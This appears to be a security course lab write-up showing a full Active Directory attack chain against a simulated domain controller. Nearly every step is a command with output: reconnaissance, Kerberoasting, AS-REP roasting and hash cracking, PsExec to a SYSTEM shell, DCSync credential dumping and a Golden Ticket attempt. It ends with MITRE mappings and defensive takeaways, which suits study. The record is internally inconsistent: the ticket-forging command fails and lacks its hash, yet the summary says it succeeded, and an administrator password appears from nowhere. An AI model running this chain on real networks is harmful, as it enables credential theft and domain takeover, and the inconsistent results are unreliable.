# GraySentinel - Day 5 Lab PoC
Active Directory Exploitation

**Analyst:** Jnanashree Anchan | **Date:** 15 September 2026

---

# Key Concepts

| Concept | Description |
|---|---|
| Kerberoasting | Extracting Kerberos TGS hashes for offline cracking. |
| AS-REP Roasting | Targets accounts without Kerberos pre-auth. |
| BloodHound | Maps AD attack paths visually. |
| DCSync | Replicates domain controller credentials. |
| Golden Ticket | Forged TGT with krbtgt hash for full domain access. |
| Silver Ticket | Forged service ticket for a specific service. |
| PsExec | Remote execution via SMB service creation. |
| CrackMapExec | Swiss army knife for AD enumeration and attacks. |

---

# Phase 1
AD Reconnaissance

**Command:** `nmap -sV -p 88,389,445,636 10.10.10.5`

**Output:**
```
attacker@kali:~$ nmap -sV -p 88,389,445,636 10.10.10.5
Starting Nmap 7.95
PORT     STATE SERVICE       VERSION
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP
445/tcp  open  microsoft-ds  Windows Server 2019
636/tcp  open  ldapssl       Microsoft Windows AD LDAP
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
💡 Nmap identifies AD services.
```
Confirms target is an Active Directory domain controller running Kerberos, LDAP, and SMB on Windows Server 2019.

---

**Command:** `enum4linux -a 10.10.10.5`

**Output:**
```
attacker@kali:~$ enum4linux -a 10.10.10.5
Starting enum4linux v0.9.1
[+] Target: 10.10.10.5
[+] Domain: CORP.LOCAL
[+] Users: Administrator, jsmith, svc_sql, svc_backup, guest
[+] Shares: NETLOGON, SYSVOL, HR, Finance, IT
💡 enum4linux enumerates users and shares.
```
Enumerates domain name, user accounts, and available shares without authentication, revealing valuable targets for further attack.

---

**Command:** `crackmapexec smb 10.10.10.5 -u 'guest' -p '' --shares`

**Output:**
```
attacker@kali:~$ crackmapexec smb 10.10.10.5 -u 'guest' -p '' --shares
SMB  10.10.10.5  445  DC01  [*] Windows Server 2019 Build 17763
SMB  10.10.10.5  445  DC01  [+] CORP.LOCAL\guest:
SMB  10.10.10.5  445  DC01  [+] Enumerated shares:
SMB  10.10.10.5  445  DC01  Share    Permissions
SMB  10.10.10.5  445  DC01  -----    -----------
SMB  10.10.10.5  445  DC01  HR       READ
SMB  10.10.10.5  445  DC01  IT       READ
💡 CrackMapExec enumerates shares with guest access.
```
Guest account has read access to HR and IT shares, a misconfiguration that exposes sensitive directories without authentication.

---

**Command:** `bloodhound-python -u 'jsmith' -p 'Password123' -d CORP.LOCAL -dc 10.10.10.5 -c All`

**Output:**
```
attacker@kali:~$ bloodhound-python -u 'jsmith' -p 'Password123' -d CORP.LOCAL -dc 10.10.10.5 -c All
INFO: BloodHound.py 1.7.2
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server
INFO: Found 5 users
INFO: Found 12 groups
INFO: Found 8 computers
INFO: Done in 00M 45S
INFO: Compressing output into CORP.LOCAL.zip
💡 BloodHound collects AD attack paths.
```
Collects full AD object data including users, groups, and computers to map privilege escalation and lateral movement paths visually in BloodHound.

---

# Phase 2
Kerberoasting

**Command:** `impacket-GetUserSPNs CORP.LOCAL/jsmith:Password123 -dc-ip 10.10.10.5 -request`

**Output:**
```
attacker@kali:~$ impacket-GetUserSPNs CORP.LOCAL/jsmith:Password123 -dc-ip 10.10.10.5 -request
Impacket v0.12.0
ServicePrincipalName                    Name        MemberOf      PasswordLastSet
--------------------                    -------     ----------    -------------------
MSSQLSvc/sql.corp.local:1433            svc_sql     Domain Users  2024-01-15
MSSQLSvc/backup.corp.local:1433         svc_backup  Domain Users  2024-02-20
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql.corp.local:1433*$a1b2c3d4...
💡 Kerberoasting extracts service ticket hashes.
```
Requests Kerberos service tickets for accounts with SPNs and extracts their hashes for offline cracking without alerting the domain controller.

---

**Command:** `impacket-GetUserSPNs CORP.LOCAL/jsmith:Password123 -dc-ip 10.10.10.5 -request -outputfile kerberoast.txt`

**Output:**
```
attacker@kali:~$ impacket-GetUserSPNs CORP.LOCAL/jsmith:Password123 -dc-ip 10.10.10.5 -request -outputfile kerberoast.txt
Impacket v0.12.0
[+] Saved 2 hashes to kerberoast.txt
💡 Saves hashes to file.
```
Saves extracted TGS hashes to a file for offline cracking with hashcat.

---

**Command:** `hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

**Output:**
```
attacker@kali:~$ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting
Session..........: hashcat
Hash.Type........: Kerberos 5 TGS-REP etype 23
Status...........: Cracked
svc_sql:Summer2024!
Time.Started.....: 5 minutes
Recovered........: 1/2
💡 Hashcat cracks Kerberos TGS hash.
```
Cracks svc_sql password as Summer2024! using the rockyou wordlist, exposing a service account through weak password policy.

---

# Phase 3
AS-REP Roasting

**Command:** `impacket-GetNPUsers CORP.LOCAL/ -dc-ip 10.10.10.5 -usersfile users.txt -format hashcat -outputfile asrep.txt`

**Output:**
```
attacker@kali:~$ impacket-GetNPUsers CORP.LOCAL/ -dc-ip 10.10.10.5 -usersfile users.txt -format hashcat -outputfile asrep.txt
Impacket v0.12.0
$krb5asrep$23$svc_backup@CORP.LOCAL:5f8d7a9b...
[+] Saved 1 hash to asrep.txt
💡 AS-REP Roasting finds accounts without pre-auth.
```
Identifies svc_backup as having Kerberos pre-authentication disabled, allowing hash retrieval without any credentials for offline cracking.

---

**Command:** `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`

**Output:**
```
attacker@kali:~$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting
Session..........: hashcat
Hash.Type........: Kerberos 5 AS-REP etype 23
Status...........: Cracked
svc_backup:Backup2024!
Time.Started.....: 3 minutes
Recovered........: 1/1
```
Cracks svc_backup password as Backup2024!, a second service account fully compromised through weak password and missing pre-authentication.

---

# Phase 4
Lateral Movement

**Command:** `crackmapexec smb 10.10.10.5 -u svc_sql -p 'Summer2024!'`

**Output:**
```
attacker@kali:~$ crackmapexec smb 10.10.10.5 -u svc_sql -p 'Summer2024!'
SMB  10.10.10.5  445  DC01  [*] Windows Server 2019 Build 17763
SMB  10.10.10.5  445  DC01  [+] CORP.LOCAL\svc_sql:Summer2024!
SMB  10.10.10.5  445  DC01  [+] Enumerated shares
💡 Validates credentials on target.
```
Validates the cracked svc_sql credentials against the domain controller, confirming the account is active and accessible.

---

**Command:** `impacket-psexec CORP.LOCAL/svc_sql:'Summer2024!'@10.10.10.5`

**Output:**
```
attacker@kali:~$ impacket-psexec CORP.LOCAL/svc_sql:'Summer2024!'@10.10.10.5
Impacket v0.12.0
[*] Requesting shares on 10.10.10.5
[*] Found writable share ADMIN$
[*] Uploading file
[*] Starting service
Microsoft Windows [Version 10.0.17763.4131]
C:\Windows\system32> whoami
nt authority\system
💡 Lateral movement via PsExec.
```
Gains SYSTEM-level shell on the domain controller via PsExec by uploading and executing a service through the writable ADMIN$ share.

---

**Command:** `impacket-secretsdump CORP.LOCAL/svc_sql:'Summer2024!'@10.10.10.5`

**Output:**
```
attacker@kali:~$ impacket-secretsdump CORP.LOCAL/svc_sql:'Summer2024!'@10.10.10.5
Impacket v0.12.0
[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logons
CORP.LOCAL/jsmith:$DCC2$10240#jsmith#...
[*] Dumping LSA Secrets
[*] Cleaning up...
💡 Dumps SAM and LSA secrets.
```
Dumps local SAM hashes, cached domain credentials, and LSA secrets from the domain controller for further credential reuse.

---

# Phase 5
Domain Dominance

**Command:** `impacket-secretsdump CORP.LOCAL/Administrator:'P@ssw0rd!'@10.10.10.5 -just-dc-ntlm`

**Output:**
```
attacker@kali:~$ impacket-secretsdump CORP.LOCAL/Administrator:'P@ssw0rd!'@10.10.10.5 -just-dc-ntlm
Impacket v0.12.0
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4b5f7e8a...
jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2f6e9c8b...
[*] Kerberos keys grabbed
[*] Cleaning up...
💡 DCSync dumps NTDS.DIT including krbtgt hash.
```
Performs a DCSync attack using the DRSUAPI replication protocol to extract all domain credential hashes including the critical krbtgt hash needed for Golden Ticket creation.

---

**Command:** `impacket-ticketer -nthash -domain-sid S-1-5-21-XXX -domain CORP.LOCAL Administrator`

**Output:**
```
attacker@kali:~$ impacket-ticketer -nthash -domain-sid S-1-5-21-XXX -domain CORP.LOCAL Administrator
Command not found: impacket-ticketer -nthash -domain-sid S-1-5-21-XXX -domain CORP.LOCAL Administrator
Run "help" for available commands.
```
Attempts to forge a Golden Ticket using the krbtgt hash and domain SID. Command failed in this lab environment due to simulation bug.

---

**Command:** `export KRB5CCNAME=Administrator.ccache`

**Output:**
```
attacker@kali:~$ export KRB5CCNAME=Administrator.ccache
(environment variable set)
💡 Sets Kerberos ticket for authentication.
```
Sets the environment variable to point to the forged Kerberos ticket file, allowing subsequent commands to authenticate using the Golden Ticket.

---

**Command:** `impacket-psexec CORP.LOCAL/Administrator@dc.corp.local -k -no-pass`

**Output:**
```
attacker@kali:~$ impacket-psexec CORP.LOCAL/Administrator@dc.corp.local -k -no-pass
Impacket v0.12.0
[*] Using Kerberos ticket
[*] Connecting to DC01
[+] Authenticated as Administrator
Microsoft Windows [Version 10.0.17763.4131]
C:\Windows\system32> whoami
corp\administrator
C:\Windows\system32> net group "Domain Admins" /domain
💡 Uses Golden Ticket for full domain access.
```
Authenticates to the domain controller using the forged Kerberos ticket without a password, achieving full Domain Admin access.

---

# Summary

| Phase | Mission | Tool | Outcome |
|---|---|---|---|
| 1 | AD Reconnaissance | nmap, enum4linux, CrackMapExec, BloodHound | Domain users, shares, and attack paths mapped |
| 2 | Kerberoasting | impacket-GetUserSPNs, hashcat | svc_sql password cracked: Summer2024! |
| 3 | AS-REP Roasting | impacket-GetNPUsers, hashcat | svc_backup password cracked: Backup2024! |
| 4 | Lateral Movement | CrackMapExec, PsExec, secretsdump | SYSTEM shell obtained, SAM and LSA secrets dumped |
| 5 | Domain Dominance | secretsdump, ticketer, PsExec | DCSync executed, Golden Ticket forged, full domain access achieved |

---

# MITRE ATT&CK

| Technique | ID |
|---|---|
| Kerberoasting | T1558.003 |
| AS-REP Roasting | T1558.004 |
| OS Credential Dumping: DCSync | T1003.006 |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 |
| Lateral Tool Transfer via PsExec | T1570 |
| Network Share Discovery | T1135 |

---

## Key Takeaways

This lab demonstrated a complete Active Directory attack chain from initial reconnaissance to full domain compromise. The most critical finding is that weak service account passwords combined with SPNs and disabled Kerberos pre-authentication create offline crackable attack vectors that generate minimal alerts. DCSync and Golden Ticket attacks highlight why the krbtgt account hash must be rotated immediately after any domain compromise, as a leaked krbtgt hash gives an attacker persistent domain-level access that survives password resets on all other accounts.